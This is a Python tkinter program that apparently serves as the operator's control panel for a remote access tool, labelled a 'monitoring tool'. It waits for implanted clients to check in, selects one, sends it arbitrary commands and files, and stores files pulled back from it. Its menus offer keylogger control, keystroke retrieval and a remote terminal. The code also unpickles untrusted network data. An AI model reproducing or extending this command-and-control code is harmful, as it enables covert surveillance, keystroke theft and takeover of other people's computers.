import tkinter as tk
import socket
import threading
import time
import pickle
import os

class App():
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Mathis' monitoring tool")
        self.root.geometry("400x300")

        self.port = 5203
        self.max_clients = 10
        self.timeout = 10
        self.selected_client = ""
        self.socket = None
        self.client = None
        self.client_addr = ()
    
        self.menu_bar = tk.Menu(self.root)

        self.filemenu = tk.Menu(self.menu_bar, tearoff=0)
        self.filemenu.add_command(label="New Connection", command=self.conn_manager)
        self.filemenu.add_separator()
        self.filemenu.add_command(label="Close")
        self.menu_bar.add_cascade(label="Connection", menu=self.filemenu)

        self.keyloggermenu = tk.Menu(self.menu_bar, tearoff=0)
        self.keyloggermenu.add_command(label="ON")
        self.keyloggermenu.add_command(label="OFF")
        self.getkeysmenu = tk.Menu(self.keyloggermenu, tearoff=0)
        self.keyloggermenu.add_cascade(label="Get Keylogger Infos")
        self.getkeysmenu.add_command(label="Text file")
        self.getkeysmenu.add_command(label="Copy")
        self.menu_bar.add_cascade(label="Keylogger", menu=self.keyloggermenu)

        self.terminalmenu = tk.Menu(self.menu_bar, tearoff=0)
        self.terminalmenu.add_command(label="New Terminal")
        self.menu_bar.add_cascade(label="Terminal", menu=self.terminalmenu)

        self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
        self.logsmenu.add_command(label="Open Logs")
        self.logsmenu.add_command(label="Reset Logs")
        self.menu_bar.add_cascade(label="Logs", menu=self.logsmenu)

        self.root.config(menu=self.menu_bar)
        
        self.cmd = CMD(self.root)

    def run(self):
        self.root.mainloop()

    def conn_manager(self):
        def search():
            conn_manager_ = ConnMaker()
            self.selected_client = conn_manager_.selected_client
            if self.selected_client != "":
                self.port = conn_manager_.port
                self.max_clients = conn_manager_.max_clients.get()
                self.timeout = conn_manager_.timeout.get()
                self.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.bind(("0.0.0.0", self.port))
                self.socket.listen(self.max_clients)
                self.socket.settimeout(1.0)
    
                while self.client == None:
                    time0 = time.time()
                    while time0 + self.timeout > time.time():
                        try:
                            client, client_addr = self.socket.accept()
                            data = client.recv(1024).decode()
                            if client_addr[0] == self.selected_client:
                                print("client selected")
                                client.sendall(b"SELECTED")
                                self.client = client
                                self.client_addr = client_addr
                                return True
                            else:
                                client.sendall(b"PINGED")
                                client.close()
                            time.sleep(0.1)
                        except Exception as e:
                            print(1, e)
        threading.Thread(target=search, daemon=True).start()
                
                
class CMD():
    def __init__(self, root):
        self.root = root
        self.text = tk.Text(root, height=70, width=240, bg="white", fg="black", insertbackground='black')
        self.text.pack()
        
        self.text.bind("<BackSpace>", self.prevent_backspace)
        self.text.bind("<Return>", self.handle_enter)
        self.text.bind("<Left>", self.on_left_arrow)
        self.text.bind("<Delete>", self.on_delete)
        
        self.prompt()
        
        self.blink_cursor()

    def prompt(self):
        self.text.insert(tk.END, "\n> ")
        self.text.mark_set("insert", tk.END)

    def prevent_backspace(self, event):
        if self.text.index(tk.INSERT).split(".")[1] <= '2':
            return "break"
        return None

    def on_delete(self, event):
        cursor_index = self.text.index(tk.INSERT)
        cursor_col = int(cursor_index.split(".")[1])
        if cursor_col == 1:
            return "break"
        return None
    
    def on_left_arrow(self, event):
        cursor_col = int(self.text.index(tk.INSERT).split(".")[1])
        if cursor_col <= 2:
            return "break"
        return None

    def handle_enter(self, event):
        line = self.text.get("insert linestart", "insert lineend").strip()
        command = line.lstrip("> ").strip()
        self.execute_command(command)
        return "break"
    
    def blink_cursor(self):
        current_color = self.text.cget('insertbackground')
        next_color = "white" if current_color == "black" else "black"
        self.text.config(insertbackground=next_color)
        self.root.after(600, self.blink_cursor)

    def execute_command(self, command):
        if app.client == None:
            self.text.insert(tk.END, "\nno client ...")
        else:
            if command == "hello":
                self.text.insert(tk.END, "\nhello !")
            elif command == "exit":
                self.root.destroy()
            else:
                data = pickle.dumps(command)
                if command.startswith("sendfile"):
                    try:
                        if not os.path.exists("ressources/send_files/"):
                            os.makedirs("ressources/send_files/")
                        path = command.split(" ")[1]
                        if "ressources/send_files/" not in path:
                            path = f"ressources/send_files/{path}"
                        with open(path, "rb") as f:
                            data_ = f.read()
                        data = pickle.dumps((command, data_))
                        
                    except Exception as e:
                        self.text.insert(tk.END, "\nError !")
                        print(3, e)
                        
                header, data = comm(app.client, f"COMMAND:{len(data)}:NONE", data)
                header = header.split(":")
                
                if header[0] == "TEXT":
                    self.text.insert(tk.END, "\n" + header[2])
                    self.text.insert(tk.END, "\n" + str(data))
                elif header[0] == "FILE":
                    self.text.insert(tk.END, "\nGET_FILE")
                    self.text.insert(tk.END, "\nDone")
                    if not os.path.exists("ressources/received_files/"):
                        os.makedirs("ressources/received_files/")
                    with open(f"ressources/received_files/{header[2]}", "wb") as f:
                        f.write(data)
                else:
                    print("mismatched type")
                    
                if header[2] == "CLOSE":
                    app.client.close()

        self.prompt()
        
        
class ConnMaker():
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Connection Manager")
        self.running = True

        self.max_clients = tk.IntVar(self.root, 10)
        self.port = app.port
        self.clients = []
        self.timeout = tk.IntVar(self.root, 2)
        self.selected_client = ""

        tk.Label(self.root, text="Max Clients : ").pack()
        tk.Entry(self.root, textvariable=self.max_clients).pack()
        tk.Label(self.root, text="Timeout : ").pack()
        tk.Entry(self.root, textvariable=self.timeout).pack()
        tk.Button(self.root, text="Update Search", command=self.update_search).pack()
        self.conn_list = tk.Listbox(self.root)
        self.conn_list.pack()
        tk.Button(self.root, text="Submit Connection", command=self.submit_client).pack()

        self.root.mainloop()

    def submit_client(self):
        try:
            selections = self.conn_list.curselection()
            if len(selections) == 1:
                self.selected_client = self.conn_list.get(selections[0])
                self.root.destroy()
                print("selected : ", self.selected_client)
            else:
                print("selection not valid !")
        except:
            print(2, "error !")

    def update_search(self):
        def search():
            local_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
            local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            local_socket.bind(("0.0.0.0", self.port))
            local_socket.listen(self.max_clients.get())
            local_socket.settimeout(1.0)

            time0 = time.time()
            self.clients = []
            timeout = self.timeout.get()
            while time0 + timeout > time.time():
                try:
                    client, client_addr = local_socket.accept()
                    data = client.recv(1024).decode()
                    time.sleep(0.1)
                    client.sendall(b"PINGED")
                    if (client_addr[0] not in self.clients) and data == "IDLE":
                        self.clients.append(client_addr[0])
                    time.sleep(0.1)
                    client.close()
                except Exception as e:
                    print(3, e)
                    
            try:
                for i, j in enumerate(self.clients):
                    self.conn_list.insert(i, j)
            except:
                return False
            return True
        
        threading.Thread(target=search, daemon=True).start()


def comm(client, header, data):
    try:
        client.send(header.encode())
        client.sendall(data)
        
        header = client.recv(1024).decode()
        bytes_data = b""
        while len(bytes_data) < int(header.split(":")[1]):
            packet = client.recv(4096)
            if not packet:
                break
            bytes_data += packet
        data = pickle.loads(bytes_data)
        
        return header, data
    except Exception as e:
        print(0, e)
        return "ERROR:ERROR:ERROR", f"error while receiving data: {e}"
    


if __name__ == "__main__":
    app = App()
    app.run()